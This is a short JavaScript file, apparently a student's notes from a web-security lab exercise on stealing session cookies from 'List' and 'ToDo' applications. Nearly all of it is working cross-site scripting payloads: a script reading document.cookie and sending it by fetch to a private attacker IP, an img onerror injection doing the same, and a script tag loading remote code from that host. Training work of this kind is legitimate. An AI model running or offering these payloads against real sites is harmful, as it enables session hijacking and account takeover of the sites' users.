let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.49.51/exfil?data=" + encodedCookie)



//3. Steal the session cookie using the "Use Non-HttpOnly Cookie" setting from the List application using the techniques taught here. [PAYLOAD USED BELOW]
//For this Payload, it is critical to understand the concept of innerHTML in JS

//<img src='x' onerror='fetch("http://192.168.45.186/exfil?data=" + encodeURIComponent(document.cookie))'>


//4. Steal the session cookie using the "Use Non-HttpOnly Cookie" setting from the ToDo application using the techniques taught here.

//<script src="http://192.168.45.186/cookies.js"></script>